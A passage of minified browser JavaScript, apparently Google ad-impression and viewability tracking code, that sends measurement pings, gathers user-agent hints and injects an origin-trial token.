      this.valueType = "boolean";
    }
    ;
    var $a = new Za("100000"),
      ab = new Za("45357156", !0),
      bb = new Za("45350890"),
      cb = new Za("45414892");
    var db = ["A7CQXglZzTrThjGTBEn1rWTxHOEtkWivwzgea+NjyardrwlieSjVuyG44PkYgIPGs8Q9svD8sF3Yedn0BBBjXAkAAACFeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="];
    function eb(a, b) {
      return "&adurl=" == a.substring(a.length - 7) ? a.substring(0, a.length - 7) + b + "&adurl=" : a + b;
    }
    ;
    function S(a) {
      return a = void 0 === a ? window : a;
    }
    ;
    var T = x.dicnf || {};
    function fb(a) {
      var b = !1,
        c;
      return function () {
        b || (c = a(), b = !0);
        return c;
      };
    }
    ;
    function gb(a, b, c) {
      a.addEventListener && a.addEventListener(b, c, !1);
    }
    function hb(a, b, c) {
      a.removeEventListener && a.removeEventListener(b, c, !1);
    }
    ;
    var ib = RegExp("^(?:([^:/?#.]+):)?(?://(?:([^\\\\/?#]*)@)?([^\\\\/?#]*?)(?::([0-9]+))?(?=[\\\\/?#]|$))?([^?#]+)?(?:\\?([^#]*))?(?:#([\\s\\S]*))?$");
    function jb(a, b, c, d) {
      for (var e = c.length; 0 <= (b = a.indexOf(c, b)) && b < d;) {
        var f = a.charCodeAt(b - 1);
        if (38 == f || 63 == f) if (f = a.charCodeAt(b + e), !f || 61 == f || 38 == f || 35 == f) return b;
        b += e + 1;
      }
      return -1;
    }
    var kb = /#|$/,
      lb = /[?&]($|#)/;
    function mb(a) {
      try {
        var b;
        if (b = !!a && null != a.location.href) a: {
          try {
            za(a.foo);
            b = !0;
            break a;
          } catch (c) {}
          b = !1;
        }
        return b;
      } catch (c) {
        return !1;
      }
    }
    function nb(a, b) {
      b = void 0 === b ? !1 : b;
      var c = void 0 === c ? x : c;
      for (var d = 0; c && 40 > d++ && (!b && !mb(c) || !a(c));) a: {
        try {
          var e = c.parent;
          if (e && e != c) {
            c = e;
            break a;
          }
        } catch (f) {}
        c = null;
      }
    }
    function ob() {
      if (!globalThis.crypto) return Math.random();
      try {
        var a = new Uint32Array(1);
        globalThis.crypto.getRandomValues(a);
        return a[0] / 65536 / 65536;
      } catch (b) {
        return Math.random();
      }
    }
    function pb(a, b) {
      if (a) for (var c in a) Object.prototype.hasOwnProperty.call(a, c) && b(a[c], c, a);
    }
    var qb = [];
    function rb() {
      var a = qb;
      qb = [];
      a = ea(a);
      for (var b = a.next(); !b.done; b = a.next()) {
        b = b.value;
        try {
          b();
        } catch (c) {}
      }
    }
    function sb(a, b) {
      "complete" === a.readyState || "interactive" === a.readyState ? (qb.push(b), 1 == qb.length && (window.Promise ? Promise.resolve().then(rb) : window.setImmediate ? setImmediate(rb) : setTimeout(rb, 0))) : a.addEventListener("DOMContentLoaded", b);
    }
    function tb(a, b) {
      b = void 0 === b ? document : b;
      return b.createElement(String(a).toLowerCase());
    }
    ;
    function U(a, b, c, d) {
      ub(x, a, void 0 === b ? null : b, !1, void 0 === c ? !1 : c, void 0 === d ? !1 : d);
    }
    function ub(a, b, c, d, e, f) {
      f = void 0 === f ? !1 : f;
      a.google_image_requests || (a.google_image_requests = []);
      var g = tb("IMG", a.document);
      if (c || e) {
        var h = function (k) {
          c && c(k);
          if (e) {
            k = a.google_image_requests;
            var l = xa(k, g);
            0 <= l && Array.prototype.splice.call(k, l, 1);
          }
          hb(g, "load", h);
          hb(g, "error", h);
        };
        gb(g, "load", h);
        gb(g, "error", h);
      }
      d && (g.referrerPolicy = "no-referrer");
      f && (g.attributionSrc = "");
      g.src = b;
      a.google_image_requests.push(g);
    }
    var vb = fb(function () {
      return "referrerPolicy" in tb("IMG");
    });
    function wb() {
      this.g = {};
    }
    function V(a) {
      xb || (xb = new yb());
      var b = xb.g[a.key];
      if ("proto" === a.valueType) {
        try {
          var c = JSON.parse(b);
          if (Array.isArray(c)) return c;
        } catch (d) {}
        return a.defaultValue;
      }
      return typeof b === typeof a.defaultValue ? b : a.defaultValue;
    }
    ;
    function yb() {
      this.g = {};
      var a = document.currentScript;
      a = (a = (a = void 0 === a ? null : a) && "0" === a.getAttribute("data-jc") ? a : document.querySelector('[data-jc="0"]')) && a.getAttribute("data-jc-flags") || "";
      try {
        var b = JSON.parse(a)[0];
        a = "";
        for (var c = 0; c < b.length; c++) a += String.fromCharCode(b.charCodeAt(c) ^ "\u0003\u0007\u0003\u0007\b\u0004\u0004\u0006\u0005\u0003".charCodeAt(c % 10));
        this.g = JSON.parse(a);
      } catch (d) {}
    }
    var xb;
    u(yb, wb);
    function zb(a, b) {
      var c = void 0 === c ? {} : c;
      this.error = a;
      this.context = b.context;
      this.msg = b.message || "";
      this.id = b.id || "jserror";
      this.meta = c;
    }
    ;
    var Bb = RegExp("^https?://(\\w|-)+\\.cdn\\.ampproject\\.(net|org)(\\?|/|$)");
    function Cb(a, b) {
      this.g = a;
      this.h = b;
    }
    function Db(a, b) {
      this.url = a;
      this.R = !!b;
      this.depth = null;
    }
    ;
    var Eb = null;
    function Fb() {
      var a = void 0 === a ? x : a;
      return (a = a.performance) && a.now && a.timing ? Math.floor(a.now() + a.timing.navigationStart) : Date.now();
    }
    function Gb() {
      var a = void 0 === a ? x : a;
      return (a = a.performance) && a.now ? a.now() : null;
    }
    ;
    function Hb(a, b) {
      var c = Gb() || Fb();
      this.label = a;
      this.type = b;
      this.value = c;
      this.duration = 0;
      this.taskId = this.slotId = void 0;
      this.uniqueId = Math.random();
    }
    ;
    var W = x.performance,
      Ib = !!(W && W.mark && W.measure && W.clearMarks),
      X = fb(function () {
        var a;
        if (a = Ib) {
          var b;
          if (null === Eb) {
            Eb = "";
            try {
              a = "";
              try {
                a = x.top.location.hash;
              } catch (c) {
                a = x.location.hash;
              }
              a && (Eb = (b = a.match(/\bdeid=([\d,]+)/)) ? b[1] : "");
            } catch (c) {}
          }
          b = Eb;
          a = !!b.indexOf && 0 <= b.indexOf("1337");
        }
        return a;
      });
    function Jb() {
      var a = window;
      this.h = [];
      this.i = a || x;
      var b = null;
      a && (a.google_js_reporting_queue = a.google_js_reporting_queue || [], this.h = a.google_js_reporting_queue, b = a.google_measure_js_timing);
      this.g = X() || (null != b ? b : 1 > Math.random());
    }
    function Kb(a) {
      a && W && X() && (W.clearMarks("goog_" + a.label + "_" + a.uniqueId + "_start"), W.clearMarks("goog_" + a.label + "_" + a.uniqueId + "_end"));
    }
    Jb.prototype.start = function (a, b) {
      if (!this.g) return null;
      a = new Hb(a, b);
      b = "goog_" + a.label + "_" + a.uniqueId + "_start";
      W && X() && W.mark(b);
      return a;
    };
    Jb.prototype.end = function (a) {
      if (this.g && "number" === typeof a.value) {
        a.duration = (Gb() || Fb()) - a.value;
        var b = "goog_" + a.label + "_" + a.uniqueId + "_end";
        W && X() && W.mark(b);
        !this.g || 2048 < this.h.length || this.h.push(a);
      }
    };
    function Lb() {
      this.i = "&";
      this.h = {};
      this.j = 0;
      this.g = [];
    }
    function Mb(a, b) {
      var c = {};
      c[a] = b;
      return [c];
    }
    function Nb(a, b, c, d, e) {
      var f = [];
      pb(a, function (g, h) {
        (g = Ob(g, b, c, d, e)) && f.push(h + "=" + g);
      });
      return f.join(b);
    }
    function Ob(a, b, c, d, e) {
      if (null == a) return "";
      b = b || "&";
      c = c || ",$";
      "string" == typeof c && (c = c.split(""));
      if (a instanceof Array) {
        if (d = d || 0, d < c.length) {
          for (var f = [], g = 0; g < a.length; g++) f.push(Ob(a[g], b, c, d + 1, e));
          return f.join(c[d]);
        }
      } else if ("object" == typeof a) return e = e || 0, 2 > e ? encodeURIComponent(Nb(a, b, c, d, e + 1)) : "...";
      return encodeURIComponent(String(a));
    }
    function Pb(a, b) {
      var c = "https://pagead2.googlesyndication.com" + b,
        d = Qb(a) - b.length;
      if (0 > d) return "";
      a.g.sort(function (n, p) {
        return n - p;
      });
      b = null;
      for (var e = "", f = 0; f < a.g.length; f++) for (var g = a.g[f], h = a.h[g], k = 0; k < h.length; k++) {
        if (!d) {
          b = null == b ? g : b;
          break;
        }
        var l = Nb(h[k], a.i, ",$");
        if (l) {
          l = e + l;
          if (d >= l.length) {
            d -= l.length;
            c += l;
            e = a.i;
            break;
          }
          b = null == b ? g : b;
        }
      }
      a = "";
      null != b && (a = e + "trn=" + b);
      return c + a;
    }
    function Qb(a) {
      var b = 1,
        c;
      for (c in a.h) b = c.length > b ? c.length : b;
      return 3997 - b - a.i.length - 1;
    }
    ;
    function Rb() {
      var a = Sb;
      this.m = Tb;
      this.g = void 0 === a ? null : a;
      this.h = null;
      this.i = !1;
      this.o = this.j;
    }
    function Ub(a) {
      var b = Vb;
      try {
        if (b.g && b.g.g) {
          var c = b.g.start(903 .toString(), 3);
          var d = a();
          b.g.end(c);
        } else d = a();
      } catch (g) {
        a = !0;
        try {
          Kb(c), a = b.o(903, new zb(g, {
            message: Wb(g)
          }), void 0, void 0);
        } catch (h) {
          b.j(217, h);
        }
        if (a) {
          var e, f;
          null == (e = window.console) || null == (f = e.error) || f.call(e, g);
        } else throw g;
      }
      return d;
    }
    function Xb(a) {
      return function () {
        var b = pa.apply(0, arguments);
        return Ub(function () {
          return a.apply(void 0, b);
        });
      };
    }
    Rb.prototype.j = function (a, b, c, d, e) {
      e = e || "jserror";
      try {
        var f = new Lb();
        f.g.push(1);
        f.h[1] = Mb("context", a);
        b.error && b.meta && b.id || (b = new zb(b, {
          message: Wb(b)
        }));
        if (b.msg) {
          var g = b.msg.substring(0, 512);
          f.g.push(2);
          f.h[2] = Mb("msg", g);
        }
        var h = b.meta || {};
        if (this.h) try {
          this.h(h);
        } catch (ja) {}
        if (d) try {
          d(h);
        } catch (ja) {}
        b = [h];
        f.g.push(3);
        f.h[3] = b;
        d = x;
        b = [];
        g = null;
        do {
          var k = d;
          if (mb(k)) {
            var l = k.location.href;
            g = k.document && k.document.referrer || null;
          } else l = g, g = null;
          b.push(new Db(l || ""));
          try {
            d = k.parent;
          } catch (ja) {
            d = null;
          }
        } while (d && k != d);
        l = 0;
        for (var n = b.length - 1; l <= n; ++l) b[l].depth = n - l;
        k = x;
        if (k.location && k.location.ancestorOrigins && k.location.ancestorOrigins.length == b.length - 1) for (n = 1; n < b.length; ++n) {
          var p = b[n];
          p.url || (p.url = k.location.ancestorOrigins[n - 1] || "", p.R = !0);
        }
        var q = new Db(x.location.href, !1);
        k = null;
        var v = b.length - 1;
        for (p = v; 0 <= p; --p) {
          var t = b[p];
          !k && Bb.test(t.url) && (k = t);
          if (t.url && !t.R) {
            q = t;
            break;
          }
        }
        t = null;
        var y = b.length && b[v].url;
        0 != q.depth && y && (t = b[v]);
        var w = new Cb(q, t);
        if (w.h) {
          var r = w.h.url || "";
          f.g.push(4);
          f.h[4] = Mb("top", r);
        }
        var I = {
          url: w.g.url || ""
        };
        if (w.g.url) {
          var L = w.g.url.match(ib),
            C = L[1],
            D = L[3],
            ka = L[4];
          q = "";
          C && (q += C + ":");
          D && (q += "//", q += D, ka && (q += ":" + ka));
          var Ab = q;
        } else Ab = "";
        I = [I, {
          url: Ab
        }];
        f.g.push(5);
        f.h[5] = I;
        Yb(this.m, e, f, this.i, c);
      } catch (ja) {
        try {
          Yb(this.m, e, {
            context: "ecmserr",
            rctx: a,
            msg: Wb(ja),
            url: w && w.g.url
          }, this.i, c);
        } catch (id) {}
      }
      return !0;
    };
    function Wb(a) {
      var b = a.toString();
      a.name && -1 == b.indexOf(a.name) && (b += ": " + a.name);
      a.message && -1 == b.indexOf(a.message) && (b += ": " + a.message);
      if (a.stack) {
        a = a.stack;
        var c = b;
        try {
          -1 == a.indexOf(c) && (a = c + "\n" + a);
          for (var d; a != d;) d = a, a = a.replace(RegExp("((https?:/..*/)[^/:]*:\\d+(?:.|\n)*)\\2"), "$1");
          b = a.replace(RegExp("\n *", "g"), "\n");
        } catch (e) {
          b = c;
        }
      }
      return b;
    }
    ;
    function Zb(a) {
      var b = "J";
      if (a.J && a.hasOwnProperty(b)) return a.J;
      b = new a();
      return a.J = b;
    }
    ;
    function $b() {}
    ;
    function ac() {
      this.g = Math.random();
    }
    function bc() {
      var a = Tb,
        b = window.google_srt;
      0 <= b && 1 >= b && (a.g = b);
    }
    function Yb(a, b, c, d, e) {
      if (((void 0 === d ? 0 : d) ? a.g : Math.random()) < (e || .01)) try {
        if (c instanceof Lb) var f = c;else f = new Lb(), pb(c, function (h, k) {
          var l = f,
            n = l.j++;
          h = Mb(k, h);
          l.g.push(n);
          l.h[n] = h;
        });
        var g = Pb(f, "/pagead/gen_204?id=" + b + "&");
        g && U(g);
      } catch (h) {}
    }
    ;
    var Tb,
      Vb,
      Sb = new Jb();
    function cc() {
      if (!window.google_measure_js_timing) {
        var a = Sb;
        a.g = !1;
        a.h != a.i.google_js_reporting_queue && (X() && ya(a.h, Kb), a.h.length = 0);
      }
    }
    (function (a) {
      Tb = null != a ? a : new ac();
      "number" !== typeof window.google_srt && (window.google_srt = Math.random());
      bc();
      Vb = new Rb();
      Vb.h = function () {};
      Vb.i = !0;
      "complete" == window.document.readyState ? cc() : Sb.g && gb(window, "load", function () {
        cc();
      });
    })();
    var dc = ["FRAME", "IMG", "IFRAME"],
      ec = /^[01](px)?$/;
    function fc(a) {
      return "string" === typeof a ? document.getElementById(a) : a;
    }
    function gc(a, b, c, d, e, f, g) {
      c = void 0 === c ? !0 : c;
      d = void 0 === d ? !1 : d;
      f = void 0 === f ? !1 : f;
      g = void 0 === g ? !1 : g;
      if (a = fc(a)) {
        e || (e = function (C, D, ka) {
          C.addEventListener(D, ka);
        });
        for (var h = !1, k = function (C) {
            h || (h = !0, b(C));
          }, l, n, p = 0; p < dc.length; ++p) if (dc[p] == a.tagName) {
          n = 3;
          l = [a];
          break;
        }
        l || (l = a.querySelectorAll(dc.join(",")), n = 2);
        var q = 0,
          v = 0,
          t = !g,
          y = a = !1;
        p = {};
        for (var w = 0; w < l.length; p = {
          v: p.v
        }, w++) {
          var r = l[w];
          if (!("IMG" == r.tagName && (r.complete && (!r.naturalWidth || !r.naturalHeight) || (void 0 === g ? 0 : g) && r.style && "none" === r.style.display) || ec.test(r.getAttribute("width")) && ec.test(r.getAttribute("height")))) {
            p.v = "IMG" === r.tagName;
            if ("IMG" == r.tagName) var I = r.naturalWidth && r.naturalHeight ? !0 : !1;else try {
              I = "complete" === (r.readyState ? r.readyState : r.contentWindow && r.contentWindow.document && r.contentWindow.document.readyState) ? !0 : !1;
            } catch (C) {
              I = void 0 === d ? !1 : d;
            }
            if (I) a = !0, p.v && (t = !0);else {
              q++;
              var L = function (C) {
                return function (D) {
                  q--;
                  !q && t && k(n);
                  C.v && (D = D && "error" === D.type, v--, D || (t = !0), !v && y && t && k(n));
                };
              }(p);
              e(r, "load", L);
              p.v && (v++, e(r, "error", L));
            }
          }
        }
        0 === v && (t = !0);
        l = null;
        if (0 === q && !a && "complete" === x.document.readyState) n = 5;else if (q || !a) {
          e(x, "load", function () {
            !f || !v && t ? k(4) : y = !0;
          });
          return;
        }
        c && k(n);
      }
    }
    ;
    function hc(a, b, c) {
      if (a) for (var d = 0; null != a && 500 > d && !c(a); ++d) a = b(a);
    }
    function ic(a, b) {
      hc(a, function (c) {
        try {
          return c === c.parent ? null : c.parent;
        } catch (d) {}
        return null;
      }, b);
    }
    function jc(a, b) {
      if ("IFRAME" == a.tagName) b(a);else {
        a = a.querySelectorAll("IFRAME");
        for (var c = 0; c < a.length && !b(a[c]); ++c);
      }
    }
    function kc(a) {
      return (a = a.ownerDocument) && (a.parentWindow || a.defaultView) || null;
    }
    function lc(a, b, c) {
      try {
        var d = JSON.parse(c.data);
      } catch (g) {}
      if ("object" === typeof d && d && "creativeLoad" === d.type) {
        var e = kc(a);
        if (c.source && e) {
          var f;
          ic(c.source, function (g) {
            try {
              if (g.parent === e) return f = g, !0;
            } catch (h) {}
          });
          f && jc(a, function (g) {
            if (g.contentWindow === f) return b(d), !0;
          });
        }
      }
    }
    function mc(a) {
      return "string" === typeof a ? document.getElementById(a) : a;
    }
    function nc(a, b) {
      var c = mc(a);
      if (c) if (c.onCreativeLoad) c.onCreativeLoad(b);else {
        var d = b ? [b] : [],
          e = function (f) {
            for (var g = 0; g < d.length; ++g) try {
              d[g](1, f);
            } catch (h) {}
            d = {
              push: function (h) {
                h(1, f);
              }
            };
          };
        c.onCreativeLoad = function (f) {
          d.push(f);
        };
        c.setAttribute("data-creative-load-listener", "");
        c.addEventListener("creativeLoad", function (f) {
          e(f.detail);
        });
        x.addEventListener("message", function (f) {
          lc(c, e, f);
        });
      }
    }
    ;
    function Y(a) {
      var b = this;
      this.h = !1;
      this.g = [];
      a(function (c) {
        oc(b, c);
      });
    }
    function oc(a, b) {
      if (!a.h) if (b instanceof Y) b.then(function (c) {
        oc(a, c);
      });else {
        a.h = !0;
        a.i = b;
        for (b = 0; b < a.g.length; ++b) pc(a, a.g[b]);
        a.g = [];
      }
    }
    function pc(a, b) {
      a.h ? b(a.i) : a.g.push(b);
    }
    Y.prototype.then = function (a) {
      var b = this;
      return new Y(function (c) {
        pc(b, function (d) {
          c(a(d));
        });
      });
    };
    function qc(a) {
      var b = a.length,
        c = 0;
      return new Y(function (d) {
        if (0 == b) d([]);else for (var e = [], f = {
            s: 0
          }; f.s < b; f = {
          s: f.s
        }, ++f.s) a[f.s].then(function (g) {
          return function (h) {
            e[g.s] = h;
            ++c == b && d(e);
          };
        }(f));
      });
    }
    function rc() {
      var a,
        b = new Y(function (c) {
          a = c;
        });
      return new sc(b, a);
    }
    function sc(a, b) {
      this.promise = a;
      this.resolve = b;
    }
    ;
    function tc(a) {
      return a.prerendering ? 3 : {
        visible: 1,
        hidden: 2,
        prerender: 3,
        preview: 4,
        unloaded: 5
      }[a.visibilityState || a.webkitVisibilityState || a.mozVisibilityState || ""] || 0;
    }
    function uc(a) {
      var b;
      a.visibilityState ? b = "visibilitychange" : a.mozVisibilityState ? b = "mozvisibilitychange" : a.webkitVisibilityState && (b = "webkitvisibilitychange");
      return b;
    }
    ;
    function vc(a, b, c) {
      function d(k) {
        try {
          var l = "object" === typeof k.data ? k.data : JSON.parse(k.data);
          g === l.paw_id && (window.clearTimeout(h), window.removeEventListener("message", d), l.signal ? b(l.signal) : l.error && c(l.error));
        } catch (n) {
          k = {
            msg: "postmessageError",
            err: n instanceof Error ? n.message : "nonError",
            data: null == k.data ? "null" : 500 < k.data.length ? k.data.substring(0, 500) : k.data
          }, Zb($b), l = [], !k.eid && l.length && (k.eid = l.toString()), Yb(Tb, "paw_sigs", k, !0);
        }
      }
      var e = {},
        f = 200;
      e = void 0 === e ? {} : e;
      b = void 0 === b ? function () {} : b;
      c = void 0 === c ? function () {} : c;
      f = void 0 === f ? 200 : f;
      var g = String(Math.floor(2147483647 * ob())),
        h = 0;
      window.addEventListener("message", function (k) {
        Xb(function () {
          d(k);
        })();
      });
      a.postMessage(Object.assign({}, {
        paw_id: g
      }, e));
      h = window.setTimeout(function () {
        window.removeEventListener("message", d);
        c("PAW GMA postmessage timed out.");
      }, f);
    }
    function wc() {
      var a = window,
        b,
        c;
      if (a.gmaSdk || (null == (b = a.webkit) ? 0 : null == (c = b.messageHandlers) ? 0 : c.getGmaViewSignals)) return a;
      try {
        var d = window.parent,
          e,
          f;
        if (d.gmaSdk || (null == (e = d.webkit) ? 0 : null == (f = e.messageHandlers) ? 0 : f.getGmaViewSignals)) return d;
      } catch (g) {}
      return null;
    }
    ;
    function xc(a) {
      this.l = P(a);
    }
    u(xc, R);
    function yc(a) {
      this.l = P(a);
    }
    u(yc, R);
    function zc(a, b) {
      return Q(a, 2, b);
    }
    function Ac(a, b) {
      return Q(a, 3, b);
    }
    function Bc(a, b) {
      return Q(a, 4, b);
    }
    function Cc(a, b) {
      return Q(a, 5, b);
    }
    function Dc(a, b) {
      return Q(a, 9, b);
    }
    function Ec(a, b) {
      var c = b;
      b = a.l;
      var d = M(b);
      if (d & 2) throw Error();
      if (null != c) {
        for (var e = !!c.length, f = 0; f < c.length; f++) {
          var g = c[f];
          e = e && !(J(g.l) & 2);
        }
        g = J(c);
        f = g | 1;
        f = (e ? f | 8 : f & -9) | 4;
        f != g && (Object.isFrozen(c) && (c = Array.prototype.slice.call(c)), K(c, f));
      }
      null == c && (c = void 0);
      Va(b, d, 10, c);
      return a;
    }
    function Fc(a, b) {
      return Ua(a, 11, null == b ? b : Ma(b));
    }
    function Gc(a, b) {
      return Q(a, 1, b);
    }
    function Hc(a, b) {
      return Ua(a, 7, null == b ? b : Ma(b));
    }
    yc.aa = [10, 6];
    var Ic = "platform platformVersion architecture model uaFullVersion bitness fullVersionList wow64".split(" ");
    function Jc(a) {
      var b;
      return null != (b = a.google_tag_data) ? b : a.google_tag_data = {};
    }
    function Kc(a) {
      var b, c;
      return "function" === typeof (null == (b = a.navigator) ? void 0 : null == (c = b.userAgentData) ? void 0 : c.getHighEntropyValues);
    }
    function Lc(a) {
      if (!Kc(a)) return null;
      var b = Jc(a);
      if (b.uach_promise) return b.uach_promise;
      a = a.navigator.userAgentData.getHighEntropyValues(Ic).then(function (c) {
        null != b.uach || (b.uach = c);
        return c;
      });
      return b.uach_promise = a;
    }
    function Mc(a) {
      var b;
      return Fc(Ec(Cc(zc(Gc(Bc(Hc(Dc(Ac(new yc(), a.architecture || ""), a.bitness || ""), a.mobile || !1), a.model || ""), a.platform || ""), a.platformVersion || ""), a.uaFullVersion || ""), (null == (b = a.fullVersionList) ? void 0 : b.map(function (c) {
        var d = new xc();
        d = Q(d, 1, c.brand);
        return Q(d, 2, c.version);
      })) || []), a.wow64 || !1);
    }
    function Nc(a) {
      var b, c;
      return null != (c = null == (b = Lc(a)) ? void 0 : b.then(function (d) {
        return Mc(d);
      })) ? c : null;
    }
    ;
    function Oc(a) {
      return ["omid_v1_present", "omid_v1_present_web", "omid_v1_present_app"].some(function (b) {
        try {
          var c = a.frames && !!a.frames[b];
        } catch (d) {
          c = !1;
        }
        return c;
      });
    }
    ;
    function Pc() {
      this.g = x.document;
      this.u = x;
      this.h = null;
      this.i = this.j = "";
      this.m = Qc();
      Rc(this);
    }
    function Rc(a) {
      var b = [],
        c = V(bb) || !!T.aub;
      if (c || T.aunb) {
        var d = Nc(a.u);
        d && (d = d.then(function (p) {
          p = Xa(p);
          for (var q = [], v = 0, t = 0; t < p.length; t++) {
            var y = p.charCodeAt(t);
            255 < y && (q[v++] = y & 255, y >>= 8);
            q[v++] = y;
          }
          p = Ca(q, 3);
          a.j = p;
        }), c && b.push(d));
      }
      if (V(ab) || V(cb)) {
        c = wc();
        var e;
        if (null == c ? 0 : null == (e = c.gmaSdk) ? 0 : e.getViewSignals) (e = c.gmaSdk.getViewSignals()) && !V(cb) && (a.i = "&ms=" + e);else {
          var f, g;
          if (null == c ? 0 : null == (f = c.webkit) ? 0 : null == (g = f.messageHandlers) ? 0 : g.getGmaViewSignals) {
            var h, k;
            vc(null == c ? void 0 : null == (h = c.webkit) ? void 0 : null == (k = h.messageHandlers) ? void 0 : k.getGmaViewSignals, function (p) {
              V(cb) || (a.i = "&" + p);
            }, function () {});
          }
        }
      }
      T.umi && (e = new Y(function (p) {
        a.h = p;
      }), b.push(e));
      if (T.ebrpfa || V($a)) {
        var l = rc();
        b.push(l.promise);
        sb(a.g, function () {
          gc(a.g.body, l.resolve);
        });
      }
      3 == tc(a.g) && 3 == tc(a.g) && b.push(Sc(a));
      if (T.opxdv && a.m) {
        var n = rc();
        b.push(n.promise);
        e = x.omrhp;
        "function" === typeof e ? e(n.resolve) : (e = x.document.querySelector("script[data-jc='86']")) && e.addEventListener("load", function () {
          x.omrhp(n.resolve);
        });
      }
      a.o = qc(b);
    }
    function Tc(a) {
      var b = a.search(kb);
      var c = jb(a, 0, "ase", b);
      if (0 > c) b = null;else {
        var d = a.indexOf("&", c);
        if (0 > d || d > b) d = b;
        b = decodeURIComponent(a.slice(c + 4, -1 !== d ? d : 0).replace(/\+/g, " "));
      }
      if (b === 2 .toString()) {
        var e = x.document;
        e = void 0 === e ? document : e;
        var f;
        e = null != (f = e.featurePolicy) && f.allowedFeatures().includes("attribution-reporting") ? 6 : 5;
        f = a.search(kb);
        b = 0;
        for (d = []; 0 <= (c = jb(a, b, "nis", f));) d.push(a.substring(b, c)), b = Math.min(a.indexOf("&", c) + 1 || f, f);
        d.push(a.slice(b));
        d.join("").replace(lb, "$1");
        null != e && encodeURIComponent(String(e));
        e = !1;
        f = !0;
        e = void 0 === e ? !1 : e;
        f = void 0 === f ? !1 : f;
        x.fetch ? (e = {
          keepalive: !0,
          credentials: "include",
          redirect: "follow",
          method: "get",
          mode: "no-cors"
        }, f && (e.mode = "cors", "setAttributionReporting" in XMLHttpRequest.prototype ? e.attributionReporting = {
          eventSourceEligible: "true",
          triggerEligible: "false"
        } : e.headers = {
          "Attribution-Reporting-Eligible": "event-source"
        }), x.fetch(a, e)) : U(a, void 0, e, f);
      } else if (T.atsb) {
        e = void 0 === e ? !1 : e;
        if (f = x.navigator) f = x.navigator.userAgent, f = /Chrome/.test(f) && !/Edge/.test(f) ? !0 : !1;
        f && x.navigator.sendBeacon ? x.navigator.sendBeacon(a) : U(a, void 0, e);
      } else U(a);
    }
    function Qc() {
      var a = S(x).omid3p,
        b = !!a && "function" === typeof a.registerSessionObserver && "function" === typeof a.addEventListener;
      b || nb(function (c) {
        Oc(c) && (b = !0);
        return b;
      }, !0);
      return b;
    }
    function Sc(a) {
      return new Y(function (b) {
        var c = uc(a.g);
        if (c) {
          var d = function () {
            3 != tc(a.g) && (hb(a.g, c, d), b());
          };
          gb(a.g, c, d);
        }
      });
    }
    ;
    function Z() {
      return new Date().getTime();
    }
    function Uc() {
      try {
        var a = void 0 === a ? document : a;
        var b;
        return !(null == (b = a.featurePolicy) || !b.features().includes("attribution-reporting"));
      } catch (c) {
        return !1;
      }
    }
    function Vc(a) {
      var b = a.querySelector('a img[alt="Advertisement"]');
      return b && /^img_anch_/.test(b.parentElement.id) ? b : a;
    }
    function Wc(a, b) {
      this.I = a;
      this.u = this.i = this.g = !1;
      this.O = 1;
      this.m = T.eavp ? 1 : 0;
      this.h = T.ebrp ? 1 : 0;
      this.W = !!T.opxb;
      this.D = this.A = null;
      this.H = rc();
      this.N = Z();
      this.M = null;
      this.T = .001 > Math.random();
      this.P = T.eeid || "";
      this.C = this.o = null;
      this.U = (Math.random() + "").slice(-5);
      this.j = !1;
      this.B = null;
      this.K = 0;
      this.F = this.G = null;
      this.V = !!T.fld;
      this.S = T.adsg || "";
      this.Y = !!T.uffp;
      this.X = !!T.espa;
      if (a = !!T.aifbl) {
        var c, d;
        a = -1 != (null == (c = x.navigator) ? void 0 : null == (d = c.userAgent) ? void 0 : d.indexOf("Firefox"));
      }
      this.L = a;
      Xc(this, b);
    }
    var Yc;
    function Zc(a, b) {
      b && 0 !== a.h && (a.C = Z() - a.N, a.L && (b = Vc(b)), $c(a, b).then(function (c) {
        c && (a.A = c);
        a.u = !0;
        ad(a);
      }));
    }
    function bd() {
      try {
        nb(function (a) {
          a = a.document;
          if (db.length && a.head) for (var b = ea(db), c = b.next(); !c.done; c = b.next()) if ((c = c.value) && a.head) {
            var d = tb("META");
            a.head.appendChild(d);
            d.httpEquiv = "origin-trial";
            d.content = c;
          }
          return !1;
        }, !1);
      } catch (a) {}
    }
    function Xc(a, b) {
      Zc(a, b);
      bd();
      0 !== a.h || 0 !== a.m ? cd(a) ? dd(a).then(function () {
        ed(a);
      }) : ed(a) : a.B = 1;
      Zb(Pc).o.then(function () {
        a.g = !0;
        ad(a);
      });
      fd(a);
      ad(a);
    }
    function $c(a, b) {
      return new Y(function (c) {
        function d(e, f) {
          a.D = e;
          c(f);
        }
        nc(b, d);
        gc(b, d, !0, !1, void 0, !0, a.L);
      });
    }
    function cd(a) {
      a.j = Qc();
      a.B = a.j ? 4 : 1;
      return a.j;
    }
    function dd(a) {
      return new Y(function (b) {
        function c(e) {
          a.B = 3;
          e && (a.G = e.src, a.F = e.sdk);
          b();
        }
        var d = x.omrhp;
        "function" === typeof d ? d(c) : (d = x.document.querySelector("script[data-jc='86']")) && d.addEventListener("load", function () {
          x.omrhp(c);
        });
      });
    }
    function ed(a) {
      a.i = !0;
      ad(a);
    }
    function ad(a) {
      if (a.g) {
        var b = null,
          c = 0;
        2 !== a.O ? b = 0 : 1 === a.m && a.g && a.i ? b = 12 : 1 === a.h && a.g && a.i && a.u && (b = 11);
        if (null != b) a: {
          if (0 === b ? 1 === a.h && a.g && a.i && a.u ? c = 2 : 1 === a.m && a.g && a.i && (c = 1) : 12 === b && 1 === a.h && a.g && a.i && a.u && (c = 2), a.W && (a.T && "" !== a.I && a.j && (a.o || 0 !== b || gd(a, !0), 12 !== b && 1 !== c && 2 !== c || gd(a, !1)), 0 === b && 0 === c)) break a;
          var d = Z(),
            e = hd(a, b, c, d);
          0 === b && (a.O = 2, a.M = d);
          if (12 === b || c) a.m = 2;
          if (11 === b || 2 === c) a.h = 2;
          if (a.V) {
            e = new Ya();
            Q(e, 1, a.S);
            e = Xa(e);
            if (0 === b) {
              d = S(x);
              var f;
              null == d || null == (f = d.fence) || f.reportEvent({
                eventType: "impression",
                eventData: e,
                destination: ["buyer"]
              });
              var g;
              null == d || null == (g = d.fence) || g.reportEvent({
                eventType: "impression",
                destination: ["component-seller"]
              });
            }
            if (11 === b || 2 === c) {
              var h, k;
              null == (h = S(x)) || null == (k = h.fence) || k.reportEvent({
                eventType: "b2rimpression",
                eventData: e,
